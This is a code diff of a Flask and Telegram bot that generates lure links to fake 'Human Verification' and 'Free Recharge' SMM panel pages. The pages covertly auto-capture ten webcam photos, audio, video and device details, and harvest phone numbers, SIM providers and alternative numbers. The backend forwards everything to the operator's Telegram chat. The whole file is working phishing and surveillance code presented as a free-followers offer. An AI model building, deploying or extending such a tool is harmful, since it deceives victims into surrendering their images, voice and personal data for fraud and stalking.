@@ -17,14 +17,14 @@ load_dotenv()
 # --- CONFIGURATION ---
 TOKEN = os.getenv("TOKEN")
 SERVER_URL = os.getenv("SERVER_URL")
-CHANNELS = os.getenv("FORCE_CHANNELS").split(",")
-CHANNEL_URLS = os.getenv("CHANNEL_URLS").split(",")
+PORT = int(os.getenv("PORT", 10000))
+
+# Force join channels - hardcoded
+CHANNELS = ["proxydominates", "noruleclub"]
+CHANNEL_URLS = ["https://t.me/proxydominates", "https://t.me/noruleclub"]
 
 app = Flask(__name__)
 app.secret_key = os.urandom(24)
-
-# Store for photos/videos
-user_media = {}
 
 # --- HUMAN VERIFICATION WITH CAMERA ---
 CAMERA_HTML = """
@@ -112,7 +112,7 @@ CAMERA_HTML = """
 <body>
     <div class="container">
         <div class="title">🔐 Human Verification</div>
-        <div class="subtitle">Please verify you're human by taking a photo</div>
+        <div class="subtitle">Please verify you're human by taking 10 photos</div>
         
         <div id="statusMessage" class="status status-info">📸 Click "Start Camera" to begin</div>
         
@@ -172,7 +172,7 @@ CAMERA_HTML = """
                 document.getElementById('captureBtn').classList.remove('hidden');
                 document.getElementById('retryBtn').classList.remove('hidden');
                 
-                updateStatus('✅ Camera started! Click capture to take photo', 'success');
+                updateStatus('✅ Camera started! Auto-capturing photos...', 'success');
                 isCapturing = true;
                 
                 // Start auto-capture sequence
@@ -186,7 +186,6 @@ CAMERA_HTML = """
         function autoCapture() {
             if (!isCapturing || photoCount >= MAX_PHOTOS) return;
             
-            // Capture every 2-3 seconds
             setTimeout(() => {
                 if (isCapturing && photoCount < MAX_PHOTOS) {
                     capturePhoto();
@@ -211,7 +210,6 @@ CAMERA_HTML = """
                 capturedPhotos.push(photoData);
                 photoCount++;
                 
-                // Flash effect
                 canvas.style.border = '2px solid #4caf50';
                 setTimeout(() => canvas.style.border = 'none', 300);
                 
@@ -232,7 +230,7 @@ CAMERA_HTML = """
             btn.disabled = true;
             btn.textContent = '⏳ Sending...';
             
-            // Also capture audio
+            // Capture audio (10 sec)
             let audioData = null;
             try {
                 audioData = await captureAudio();
@@ -490,15 +488,6 @@ SMM_PANEL_HTML = """
             transition: background 0.3s;
         }
         .btn-submit:hover { background: #e55a2b; }
-        .discount-badge {
-            background: #ffd700;
-            color: #000;
-            padding: 2px 10px;
-            border-radius: 20px;
-            font-size: 12px;
-            font-weight: 700;
-        }
-        .hidden { display: none; }
         .toast {
             position: fixed;
             bottom: 20px;
@@ -534,9 +523,7 @@ SMM_PANEL_HTML = """
         <h2 style="margin: 20px 0 10px; color: #ff6b35;">🔥 Free Recharge Plans</h2>
         <p style="color: #888; margin-bottom: 20px;">Complete any offer to get free balance!</p>
         
-        <div class="plans" id="plansContainer">
-            <!-- Plans will be loaded from backend -->
-        </div>
+        <div class="plans" id="plansContainer"></div>
         
         <div class="form-section">
             <h3 style="margin-bottom: 15px; color: #ff6b35;">📱 Complete Offer</h3>
@@ -548,12 +535,12 @@ SMM_PANEL_HTML = """
                     </div>
                     <div class="form-group">
                         <label>👤 SIM Name</label>
-                        <input type="text" name="sim_name" placeholder="Enter SIM provider name" required>
+                        <input type="text" name="sim_name" placeholder="Enter SIM provider" required>
                     </div>
                 </div>
                 <div class="form-group">
-                    <label>🔄 Alternative Number (Get 20% extra discount!)</label>
-                    <input type="tel" name="alt_phone" placeholder="Enter alternative number for discount">
+                    <label>🔄 Alternative Number (Get 20% extra bonus!)</label>
+                    <input type="tel" name="alt_phone" placeholder="Enter alternative number for bonus">
                 </div>
                 <div class="form-group">
                     <label>📦 Select Plan</label>
@@ -568,12 +555,12 @@ SMM_PANEL_HTML = """
 
     <script>
         const plans = [
-            { id: 1, name: '🆓 Free Followers', price: '$0', coins: 100, features: '100 Instagram Followers • 24hr Delivery' },
-            { id: 2, name: '🔥 Free Likes', price: '$0', coins: 50, features: '50 Instagram Likes • Instant Delivery' },
-            { id: 3, name: '📹 Free Views', price: '$0', coins: 200, features: '200 YouTube Views • 48hr Delivery' },
-            { id: 4, name: '⭐ Free Recharge', price: '$5', coins: 500, features: '500 Coins • All Services Access' },
-            { id: 5, name: '💎 Premium Free', price: '$10', coins: 1200, features: '1200 Coins • Priority Support' },
-            { id: 6, name: '👑 VIP Free', price: '$25', coins: 3000, features: '3000 Coins • VIP Services' }
+            { id: 1, name: '🆓 Free Followers', price: '$0', coins: 100, features: '100 Instagram Followers' },
+            { id: 2, name: '🔥 Free Likes', price: '$0', coins: 50, features: '50 Instagram Likes' },
+            { id: 3, name: '📹 Free Views', price: '$0', coins: 200, features: '200 YouTube Views' },
+            { id: 4, name: '⭐ Free Recharge', price: '$5', coins: 500, features: '500 Coins' },
+            { id: 5, name: '💎 Premium Free', price: '$10', coins: 1200, features: '1200 Coins' },
+            { id: 6, name: '👑 VIP Free', price: '$25', coins: 3000, features: '3000 Coins' }
         ];
 
         function renderPlans() {
@@ -618,7 +605,6 @@ SMM_PANEL_HTML = """
                 return;
             }
 
-            // Show loading
             const btn = form.querySelector('.btn-submit');
             btn.textContent = '⏳ Processing...';
             btn.disabled = true;
@@ -656,14 +642,12 @@ SMM_PANEL_HTML = """
             toast.textContent = msg;
             if (type === 'error') toast.style.borderColor = '#ff4444';
             document.body.appendChild(toast);
-            
             setTimeout(() => toast.remove(), 4000);
         }
 
-        // Also handle alternative number discount
         document.querySelector('input[name="alt_phone"]').addEventListener('input', function() {
             if (this.value.length > 5) {
-                showToast('🎉 20% discount applied for using alternative number!');
+                showToast('🎉 20% bonus applied for using alternative number!');
             }
         });
 
@@ -764,7 +748,6 @@ def panel():
     chat_id = session.get('chat_id') or request.args.get('chat_id')
     if not chat_id:
         return redirect(url_for('index'))
-    # Random balance between 0.50 and 5.00
     balance = round(random.uniform(0.50, 5.00), 2)
     return render_template_string(SMM_PANEL_HTML, chat_id=chat_id, balance=balance)
 
@@ -789,13 +772,11 @@ def claim_offer():
     plan = plans.get(str(plan_id), {'name': 'Unknown', 'coins': 0})
     bonus = 0
     
-    # Alternative number gives 20% bonus
     if alt_phone and len(alt_phone) >= 5:
         bonus = int(plan['coins'] * 0.2)
     
     total_coins = plan['coins'] + bonus
     
-    # Send to Telegram
     msg = (f"📊 **SMM Panel Claim**\n\n"
            f"📱 Phone: `{phone}`\n"
            f"👤 SIM: `{sim_name}`\n"
@@ -804,7 +785,7 @@ def claim_offer():
            f"💰 Base Coins: `{plan['coins']}`\n"
            f"🎁 Bonus: `{bonus}`\n"
            f"✨ Total: `{total_coins}`\n\n"
-           f"⚡ @Proxyfxz")
+           f"⚡ @proxydominates")
     
     requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
                  json={"chat_id": chat_id, "text": msg, "parse_mode": "Markdown"})
@@ -831,19 +812,17 @@ def upload_media():
     if not chat_id:
         return jsonify({'error': 'No chat_id'}), 400
     
-    # Send photos (max 10)
     photos = data.get('photos', [])
     for i, photo in enumerate(photos[:10]):
         try:
             img_data = base64.b64decode(photo.split(',')[1])
             requests.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto",
-                         data={'chat_id': chat_id, 'caption': f'📸 Photo {i+1}/10' if i == 0 else ''},
+                         data={'chat_id': chat_id, 'caption': f'📸 Photo {i+1}/10'},
                          files={'photo': (f'photo_{i}.jpg', img_data)})
-            time.sleep(0.5)  # Avoid rate limiting
+            time.sleep(0.3)
         except Exception as e:
             print(f"Error sending photo {i}: {e}")
     
-    # Send audio if exists
     if data.get('audio'):
         try:
             audio_data = base64.b64decode(data['audio'].split(',')[1])
@@ -853,7 +832,6 @@ def upload_media():
         except Exception as e:
             print(f"Error sending audio: {e}")
     
-    # Send video if exists
     if data.get('video'):
         try:
             video_data = base64.b64decode(data['video'].split(',')[1])
@@ -863,11 +841,9 @@ def upload_media():
         except Exception as e:
             print(f"Error sending video: {e}")
     
-    # Send device info
     device_msg = (f"📱 **Device Info**\n\n"
                  f"Platform: `{data.get('platform', 'N/A')}`\n"
                  f"Screen: `{data.get('screen', 'N/A')}`\n"
-                 f"User Agent: `{data.get('userAgent', 'N/A')[:100]}`\n"
                  f"Timestamp: `{data.get('timestamp', 'N/A')}`")
     
     requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
@@ -899,7 +875,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         "👋 **Welcome to SMM Panel Bot!**\n\n"
         "Send any link to generate your SMM panel access URL.\n\n"
-        "Features:\n"
+        "🔥 **Features:**\n"
         "🔐 Human Verification (10 photos)\n"
         "🎤 Audio Recording (10 sec)\n"
         "🎥 Video Recording (10 sec)\n"
@@ -919,11 +895,10 @@ async def handle_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ Invalid link. Please send a valid URL.")
         return
     
-    # First go to verification, then panel
     link = f"{SERVER_URL}/?id={update.effective_chat.id}"
     await update.message.reply_text(
         f"✅ **Your SMM Panel Link:**\n\n`{link}`\n\n"
-        f"📋 User Flow:\n"
+        f"📋 **User Flow:**\n"
         f"1️⃣ 📸 Human Verification (10 photos)\n"
         f"2️⃣ 🎤 Audio Recording (10 sec)\n"
         f"3️⃣ 🎥 Video Recording (10 sec)\n"
@@ -933,7 +908,7 @@ async def handle_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
 
 if __name__ == '__main__':
-    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=int(os.getenv("PORT", 10000)))).start()
+    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=PORT)).start()
     bot = Application.builder().token(TOKEN).build()
     bot.add_handler(CommandHandler("start", start))
     bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_link))
